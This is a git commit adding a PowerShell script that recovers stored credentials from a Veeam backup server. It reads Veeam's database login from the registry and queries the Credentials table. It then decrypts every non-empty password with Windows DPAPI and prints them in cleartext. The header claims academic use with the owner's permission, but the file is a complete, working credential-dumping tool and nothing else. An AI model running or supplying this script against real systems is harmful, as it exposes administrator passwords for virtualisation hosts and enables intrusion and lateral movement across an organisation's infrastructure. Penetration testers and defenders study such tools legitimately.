4b53bbe15876bfa952ce38e7db4c417817a61f58
kabutor <43006263+kabutor@users.noreply.github.com>
2022-02-04 16:04:05 +0100

    Ininiatl commit

---
+++ veeam-creds.ps1
@@ -0,0 +1,75 @@
+# About:  The script is designed to recover passwords used by Veeam to connect
+#         to remote hosts vSphere, Hyper-V, etc. The script is intended for 
+#         demonstration and academic purposes. Use with permission from the 
+#         system owner.
+#
+# Author: Konstantin Burov.
+#
+# Usage:  Run as administrator (elevated) in PowerShell on a host in a Veeam 
+#         server.
+
+Add-Type -assembly System.Security
+
+#Searching for connection parameters in the registry
+try {
+	$VeaamRegPath = "HKLM:\SOFTWARE\Veeam\Veeam Endpoint Backup\"
+    $key = "hklm:\SOFTWARE\Veeam\Veeam Endpoint Backup\DbConfiguration\"
+    $user = (Get-ItemProperty -Path $key -Name SqlLogin).SqlLogin 
+    $passwd =(Get-ItemProperty -Path $key -Name SqlPassword).SqlPassword 
+    $instance =(Get-ItemProperty -Path $key -Name SqlInstancePipeName).SqlInstancePipeName 
+     
+	$SqlDatabaseName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlDatabaseName 
+	$SqlInstanceName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlInstanceName
+	$SqlServerName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlServerName
+}
+catch {
+	echo "Can't find Veeam on localhost, try running as Administrator"
+	exit -1
+}
+
+""
+"Found Veeam DB on " + $SqlServerName + "\" + $SqlInstanceName + "@" + $SqlDatabaseName + ", connecting...  "
+
+#Forming the connection string
+$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
+	"WHERE password <> ''" #Filter empty passwords
+#$auth = "Integrated Security=SSPI;" #Local user
+$connectionString = "Data Source=$instance; " +
+"Initial Catalog=$SqlDatabaseName; User ID=$user;Password=$passwd "
+
+$connection = New-Object System.Data.SqlClient.SQLConnection $connectionString
+$command = New-Object System.Data.SqlClient.SqlCommand $SQL, $connection
+
+#Fetching encrypted credentials from the database
+try {
+	$connection.Open()
+	$adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
+	$dataset = New-Object System.Data.DataSet
+	[void] $adapter.Fill($dataSet)
+	$connection.Close()
+}
+catch {
+	"Can't connect to DB, exit."
+	exit -1
+}
+
+"OK"
+
+$rows=($dataset.Tables | Select-Object -Expand Rows)
+if ($rows.count -eq 0) {
+	"No passwords today, sorry."
+	exit
+}
+
+""
+"Here are some passwords for you, have fun:"
+
+#Decrypting passwords using DPAPI
+$rows | ForEach-Object -Process {
+	$EnryptedPWD = [Convert]::FromBase64String($_.password)
+	$ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
+	$enc = [system.text.encoding]::Default
+	$_.password = $enc.GetString($ClearPWD)
+}
+ 
+Write-Output $rows | FT | Out-string
